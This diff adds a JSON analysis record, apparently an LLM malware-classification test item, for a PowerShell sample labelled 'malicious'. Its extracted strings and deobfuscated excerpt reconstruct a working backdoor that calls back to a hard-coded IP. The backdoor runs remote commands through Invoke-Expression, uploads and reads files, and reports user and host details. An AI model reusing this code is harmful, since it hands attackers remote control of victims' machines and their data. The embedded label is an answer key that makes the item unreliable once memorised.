@@ -1,0 +1,149 @@
+{
+  "meta": {
+    "quelldatei": "0627d2a429f6e47620a7f0d409fdb0f2f1e0eb1d3cf31604cf8667b32f4408bf.ps1",
+    "sha256": "0627d2a429f6e47620a7f0d409fdb0f2f1e0eb1d3cf31604cf8667b32f4408bf",
+    "groesse_bytes": 4869,
+    "zeilen": 144,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "34.85.93.181",
+      "\n\n\n$biosSerialNumber = (Get-WmiObject -ComputerName localhost -Class Win32_BIOS).SerialNumber\n$md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider\n$utf8 = New-Object -TypeName System.Text.UTF8Encoding\n$hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($biosSerialNumber))).replace('-','').ToLower()\n\n\nFunction CheckConnect(){\n    $flag = $hash.substring(26, 6) + ",
+      " + ([System.Net.IPEndPoint]$client.Client.LocalEndPoint).Port\n    $resultDict=@{type=",
+      ";flag=$flag;user=$env:USERNAME;computer=$env:COMPUTERNAME;pid=$pid;verify=$instruct_dict.verify}\n    $resultData = $resultDict | ConvertTo-Json -Compress\n    $writer.WriteLine($resultData)\n    $writer.Flush()\n}\n\nwhile ($true) {\n    do {\n        try {\n            Write-Host ",
+      "$address",
+      "$port\n            $client = New-Object System.Net.Sockets.TcpClient($address, $port)  \n            $stream = $client.GetStream()\n            $writer = New-Object System.IO.StreamWriter($stream)\n            $reader = New-Object System.IO.StreamReader($stream) \n            break\n        }\n        catch {\n            Start-Sleep -s 1\n        }\n    } while ($true)\n\n    Write-Host ",
+      "\n\n\n  do {\n    try {\n      $instruct = $reader.ReadLine() \n      if([String]::IsNullOrEmpty($instruct)){\n        $client.Close()\n        break\n      }\n    } catch {\n        try {\n          Write-Host ",
+      "$port\n          $client = New-Object System.Net.Sockets.TcpClient($address, $port)\n          $stream = $client.GetStream()\n          $writer = New-Object System.IO.StreamWriter($stream)\n          $reader = New-Object System.IO.StreamReader($stream)\n          CheckConnect\n          Continue\n        }\n        catch {\n          Write-Host ",
+      " -Foreground ",
+      ";\n        }\n    }\n    $instruct_dict = $instruct | ConvertFrom-Json\n    $instruct_type = $instruct_dict.type\n    switch ($instruct_type) {\n      ",
+      " {\n        $cmd = $instruct_dict.cmd\n        try {\n            $output = (Invoke-Expression $cmd) 2>&1 | Out-String\n        }\n        catch  {\n            $output = $Error[0] | Out-String\n        }\n        $resultDict=@{ type = ",
+      ";output=$output;verify=$instruct_dict.verify}\n        $resultData = $resultDict | ConvertTo-Json -Compress\n        $writer.WriteLine($resultData)\n        $writer.Flush()\n      }\n      ",
+      " {\n        $file_data = $instruct_dict.fileData\n        $upload_path= $instruct_dict.uploadPath\n\n        $file_data_block = $file_data.Split(",
+      ")\n\n        $file_bytes = New-Object Byte[] $file_data_block.Count\n        for ([int] $i = 0; $i -lt $file_data_block.Count; $i++) {\n            $file_bytes[$i] = $file_data_block[$i]\n        }\n        [System.IO.File]::WriteAllBytes($upload_path, $file_bytes)\n\n        $upload_file = [System.IO.File]::ReadAllBytes($upload_path)\n\n        $resultDict=@{ type = ",
+      ";fileBytesLenght=$upload_file.Length;verify=$instruct_dict.verify}\n        $resultData = $resultDict | ConvertTo-Json -Compress\n\n        $writer.WriteLine($resultData)\n\n        try { $writer.Flush() }catch { exit } \n      }\n\n      ",
+      " {\n        $file_path = $instruct_dict.filePath\n        $file_binary_content = [System.IO.File]::ReadAllBytes($file_path)\n        $file_string_content = [string]$file_binary_content\n        $resultDict=@{ type = ",
+      ";fileContent=$file_string_content;fileBytesLength=$file_binary_content.Length}\n        $resultData = $resultDict | ConvertTo-Json -Compress\n        $writer.WriteLine($resultData)\n        try { $writer.Flush() }catch { exit }\n      }\n      ",
+      " {\n         try{\n            $tempSocket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Dgram,0)\n            $tempSocket.Connect(",
+      ", 65530)\n            $internalIP = ([System.Net.IPEndPoint] $tempSocket.LocalEndPoint).Address.ToString()\n            $tempSocket.Dispose()\n\n            $flag = $hash.substring(26, 6) + ",
+      " + ([System.Net.IPEndPoint]$client.Client.LocalEndPoint).Port\n            $resultDict=@{type=",
+      ";internalIP=$internalIP;flag=$flag;user=$env:USERNAME;computer=$env:COMPUTERNAME;pid=$pid;verify=$instruct_dict.verify}\n            $resultData = $resultDict | ConvertTo-Json -Compress \n            $writer.WriteLine($resultData)\n            $writer.Flush()\n         }catch{\n            break\n         }\n      }\n      ",
+      " {\n         try{\n             #Get-Random 1000\n             #Start-Sleep –m $i\n            CheckConnect\n            $writer.Flush()\n         }catch{\n            break\n         }\n      }\n      "
+    ],
+    "string_anzahl_gesamt": 23,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "34.85.93.181",
+      "\n\n\n$biosSerialNumber = (Get-WmiObject -ComputerName localhost -Class Win32_BIOS).SerialNumber\n$md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider\n$utf8 = New-Object -TypeName System.Text.UTF8Encoding\n$hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($biosSerialNumber))).replace('-','').ToLower()\n\n\nFunction CheckConnect(){\n    $flag = $hash.substring(26, 6) + ",
+      " + ([System.Net.IPEndPoint]$client.Client.LocalEndPoint).Port\n    $resultDict=@{type=",
+      ";flag=$flag;user=$env:USERNAME;computer=$env:COMPUTERNAME;pid=$pid;verify=$instruct_dict.verify}\n    $resultData = $resultDict | ConvertTo-Json -Compress\n    $writer.WriteLine($resultData)\n    $writer.Flush()\n}\n\nwhile ($true) {\n    do {\n        try {\n            Write-Host ",
+      "$address",
+      "$port\n            $client = New-Object System.Net.Sockets.TcpClient($address, $port)  \n            $stream = $client.GetStream()\n            $writer = New-Object System.IO.StreamWriter($stream)\n            $reader = New-Object System.IO.StreamReader($stream) \n            break\n        }\n        catch {\n            Start-Sleep -s 1\n        }\n    } while ($true)\n\n    Write-Host ",
+      "\n\n\n  do {\n    try {\n      $instruct = $reader.ReadLine() \n      if([String]::IsNullOrEmpty($instruct)){\n        $client.Close()\n        break\n      }\n    } catch {\n        try {\n          Write-Host ",
+      "$port\n          $client = New-Object System.Net.Sockets.TcpClient($address, $port)\n          $stream = $client.GetStream()\n          $writer = New-Object System.IO.StreamWriter($stream)\n          $reader = New-Object System.IO.StreamReader($stream)\n          CheckConnect\n          Continue\n        }\n        catch {\n          Write-Host ",
+      " -Foreground ",
+      ";\n        }\n    }\n    $instruct_dict = $instruct | ConvertFrom-Json\n    $instruct_type = $instruct_dict.type\n    switch ($instruct_type) {\n      ",
+      " {\n        $cmd = $instruct_dict.cmd\n        try {\n            $output = (Invoke-Expression $cmd) 2>&1 | Out-String\n        }\n        catch  {\n            $output = $Error[0] | Out-String\n        }\n        $resultDict=@{ type = ",
+      ";output=$output;verify=$instruct_dict.verify}\n        $resultData = $resultDict | ConvertTo-Json -Compress\n        $writer.WriteLine($resultData)\n        $writer.Flush()\n      }\n      ",
+      " {\n        $file_data = $instruct_dict.fileData\n        $upload_path= $instruct_dict.uploadPath\n\n        $file_data_block = $file_data.Split(",
+      ")\n\n        $file_bytes = New-Object Byte[] $file_data_block.Count\n        for ([int] $i = 0; $i -lt $file_data_block.Count; $i++) {\n            $file_bytes[$i] = $file_data_block[$i]\n        }\n        [System.IO.File]::WriteAllBytes($upload_path, $file_bytes)\n\n        $upload_file = [System.IO.File]::ReadAllBytes($upload_path)\n\n        $resultDict=@{ type = ",
+      ";fileBytesLenght=$upload_file.Length;verify=$instruct_dict.verify}\n        $resultData = $resultDict | ConvertTo-Json -Compress\n\n        $writer.WriteLine($resultData)\n\n        try { $writer.Flush() }catch { exit } \n      }\n\n      ",
+      " {\n        $file_path = $instruct_dict.filePath\n        $file_binary_content = [System.IO.File]::ReadAllBytes($file_path)\n        $file_string_content = [string]$file_binary_content\n        $resultDict=@{ type = ",
+      ";fileContent=$file_string_content;fileBytesLength=$file_binary_content.Length}\n        $resultData = $resultDict | ConvertTo-Json -Compress\n        $writer.WriteLine($resultData)\n        try { $writer.Flush() }catch { exit }\n      }\n      ",
+      " {\n         try{\n            $tempSocket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Dgram,0)\n            $tempSocket.Connect(",
+      ", 65530)\n            $internalIP = ([System.Net.IPEndPoint] $tempSocket.LocalEndPoint).Address.ToString()\n            $tempSocket.Dispose()\n\n            $flag = $hash.substring(26, 6) + ",
+      " + ([System.Net.IPEndPoint]$client.Client.LocalEndPoint).Port\n            $resultDict=@{type=",
+      ";internalIP=$internalIP;flag=$flag;user=$env:USERNAME;computer=$env:COMPUTERNAME;pid=$pid;verify=$instruct_dict.verify}\n            $resultData = $resultDict | ConvertTo-Json -Compress \n            $writer.WriteLine($resultData)\n            $writer.Flush()\n         }catch{\n            break\n         }\n      }\n      ",
+      " {\n         try{\n             #Get-Random 1000\n             #Start-Sleep –m $i\n            CheckConnect\n            $writer.Flush()\n         }catch{\n            break\n         }\n      }\n      "
+    ],
+    "string_anzahl_gesamt": 23,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-Random",
+      "Get-WmiObject",
+      "Invoke-Expression",
+      "New-Object",
+      "Out-String",
+      "Start-Sleep",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "invoke_expression": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [
+        "34.85.93.181",
+        "8.8.8.8"
+      ],
+      "pfade": [
+        "$env:COMPUTERNAME",
+        "$env:USERNAME"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "34.85.93.181",
+      "\n\n\n$biosSerialNumber = (Get-WmiObject -ComputerName localhost -Class Win32_BIOS).SerialNumber\n$md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider\n$utf8 = New-Object -TypeName System.Text.UTF8Encoding\n$hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($biosSerialNumber))).replace('-','').ToLower()\n\n\nFunction CheckConnect(){\n    $flag = $hash.substring(26, 6) + ",
+      " + ([System.Net.IPEndPoint]$client.Client.LocalEndPoint).Port\n    $resultDict=@{type=",
+      ";flag=$flag;user=$env:USERNAME;computer=$env:COMPUTERNAME;pid=$pid;verify=$instruct_dict.verify}\n    $resultData = $resultDict | ConvertTo-Json -Compress\n    $writer.WriteLine($resultData)\n    $writer.Flush()\n}\n\nwhile ($true) {\n    do {\n        try {\n            Write-Host ",
+      "$address",
+      "$port\n            $client = New-Object System.Net.Sockets.TcpClient($address, $port)  \n            $stream = $client.GetStream()\n            $writer = New-Object System.IO.StreamWriter($stream)\n            $reader = New-Object System.IO.StreamReader($stream) \n            break\n        }\n        catch {\n            Start-Sleep -s 1\n        }\n    } while ($true)\n\n    Write-Host ",
+      "\n\n\n  do {\n    try {\n      $instruct = $reader.ReadLine() \n      if([String]::IsNullOrEmpty($instruct)){\n        $client.Close()\n        break\n      }\n    } catch {\n        try {\n          Write-Host ",
+      "$port\n          $client = New-Object System.Net.Sockets.TcpClient($address, $port)\n          $stream = $client.GetStream()\n          $writer = New-Object System.IO.StreamWriter($stream)\n          $reader = New-Object System.IO.StreamReader($stream)\n          CheckConnect\n          Continue\n        }\n        catch {\n          Write-Host ",
+      " -Foreground ",
+      ";\n        }\n    }\n    $instruct_dict = $instruct | ConvertFrom-Json\n    $instruct_type = $instruct_dict.type\n    switch ($instruct_type) {\n      ",
+      " {\n        $cmd = $instruct_dict.cmd\n        try {\n            $output = (Invoke-Expression $cmd) 2>&1 | Out-String\n        }\n        catch  {\n            $output = $Error[0] | Out-String\n        }\n        $resultDict=@{ type = ",
+      ";output=$output;verify=$instruct_dict.verify}\n        $resultData = $resultDict | ConvertTo-Json -Compress\n        $writer.WriteLine($resultData)\n        $writer.Flush()\n      }\n      ",
+      " {\n        $file_data = $instruct_dict.fileData\n        $upload_path= $instruct_dict.uploadPath\n\n        $file_data_block = $file_data.Split(",
+      ")\n\n        $file_bytes = New-Object Byte[] $file_data_block.Count\n        for ([int] $i = 0; $i -lt $file_data_block.Count; $i++) {\n            $file_bytes[$i] = $file_data_block[$i]\n        }\n        [System.IO.File]::WriteAllBytes($upload_path, $file_bytes)\n\n        $upload_file = [System.IO.File]::ReadAllBytes($upload_path)\n\n        $resultDict=@{ type = ",
+      ";fileBytesLenght=$upload_file.Length;verify=$instruct_dict.verify}\n        $resultData = $resultDict | ConvertTo-Json -Compress\n\n        $writer.WriteLine($resultData)\n\n        try { $writer.Flush() }catch { exit } \n      }\n\n      ",
+      " {\n        $file_path = $instruct_dict.filePath\n        $file_binary_content = [System.IO.File]::ReadAllBytes($file_path)\n        $file_string_content = [string]$file_binary_content\n        $resultDict=@{ type = ",
+      ";fileContent=$file_string_content;fileBytesLength=$file_binary_content.Length}\n        $resultData = $resultDict | ConvertTo-Json -Compress\n        $writer.WriteLine($resultData)\n        try { $writer.Flush() }catch { exit }\n      }\n      ",
+      " {\n         try{\n            $tempSocket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Dgram,0)\n            $tempSocket.Connect(",
+      ", 65530)\n            $internalIP = ([System.Net.IPEndPoint] $tempSocket.LocalEndPoint).Address.ToString()\n            $tempSocket.Dispose()\n\n            $flag = $hash.substring(26, 6) + ",
+      " + ([System.Net.IPEndPoint]$client.Client.LocalEndPoint).Port\n            $resultDict=@{type=",
+      ";internalIP=$internalIP;flag=$flag;user=$env:USERNAME;computer=$env:COMPUTERNAME;pid=$pid;verify=$instruct_dict.verify}\n            $resultData = $resultDict | ConvertTo-Json -Compress \n            $writer.WriteLine($resultData)\n            $writer.Flush()\n         }catch{\n            break\n         }\n      }\n      ",
+      " {\n         try{\n             #Get-Random 1000\n             #Start-Sleep –m $i\n            CheckConnect\n            $writer.Flush()\n         }catch{\n            break\n         }\n      }\n      "
+    ],
+    "string_anzahl_gesamt": 23,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-Random",
+      "Get-WmiObject",
+      "Invoke-Expression",
+      "New-Object",
+      "Out-String",
+      "Start-Sleep",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "invoke_expression": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [
+        "34.85.93.181",
+        "8.8.8.8"
+      ],
+      "pfade": [
+        "$env:COMPUTERNAME",
+        "$env:USERNAME"
+      ]
+    },
+    "deobfuskiert_auszug": "$address = \"34.85.93.181\"\n$port = \"80\"\n\n\n$biosSerialNumber = (Get-WmiObject -ComputerName localhost -Class Win32_BIOS).SerialNumber\n$md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider\n$utf8 = New-Object -TypeName System.Text.UTF8Encoding\n$hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($biosSerialNumber))).replace('-','').ToLower()\n\n\nFunction CheckConnect(){\n    $flag = $hash.substring(26, 6) + \"-\" + ([System.Net.IPEndPoint]$client.Client.LocalEndPoint).Port\n    $resultDict=@{type=\"check\";flag=$flag;user=$env:USERNAME;computer=$env:COMPUTERNAME;pid=$pid;verify=$instruct_dict.verify}\n    $resultData = $resultDict | ConvertTo-Json -Compress\n    $writer.WriteLine($resultData)\n    $writer.Flush()\n}\n\nwhile ($true) {\n    do {\n        try {\n            Write-Host \"Trying to reach \"$address\":\"$port\n            $client = New-Object System.Net.Sockets.TcpClient($address, $port)  \n            $stream = $client.GetStream()\n            $writer = New-Object System.IO.StreamWriter($stream)\n            $reader = New-Object System.IO.StreamReader($stream) \n            break\n        }\n        catch {\n            Start-Sleep -s 1\n        }\n    } while ($true)\n\n    Write-Host \"Connected\"\n\n\n  do {\n    try {\n      $instruct = $reader.ReadLine() \n      if([String]::IsNullOrEmpty($instruct)){\n        $client.Close()\n        break\n      }\n    } catch {\n        try {\n          Write-Host \"Trying2 to reach \"$address\":\"$port\n          $client = New-Object System.Net.Sockets.TcpClient($address, $port)\n          $stream = $client.GetStream()\n          $writer = New-Object System.IO.StreamWriter($stream)\n          $reader = New-Object System.IO.StreamReader($stream)\n          CheckConnect\n          Continue\n        }\n        catch {\n          Write-Host \"Reconnecting to the server.....\" -Foreground \"Red\";\n        }\n    }\n    $instruct_dict = $instruct | ConvertFrom-Json\n    $instruct_type = $instruct_dict.type\n    switch ($instruct_type) {\n    ",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Zeichenkette als Code ausfuehren"
+    ]
+  }
+}
